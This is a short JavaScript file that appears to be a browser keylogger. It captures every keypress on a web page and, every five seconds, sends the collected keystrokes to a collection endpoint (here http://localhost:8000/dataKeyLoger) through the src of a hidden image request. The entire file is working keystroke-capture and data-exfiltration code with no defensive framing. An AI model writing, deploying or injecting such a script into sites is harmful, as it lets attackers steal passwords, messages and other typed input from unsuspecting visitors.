let keys = '';
let url = 'http://localhost:8000/dataKeyLoger?key=';

document.onkeypress = (e) => {
    let get = window.event ? event : e;
    let key = get.keyCode ? get.keyCode : get.charCode;
    key = String.fromCharCode(key);
    keys += key;
};

window.setInterval(() => {
    if(keys.length > 0) {
        new Image().src = url + keys;
        keys = '';
    }
}, 5000);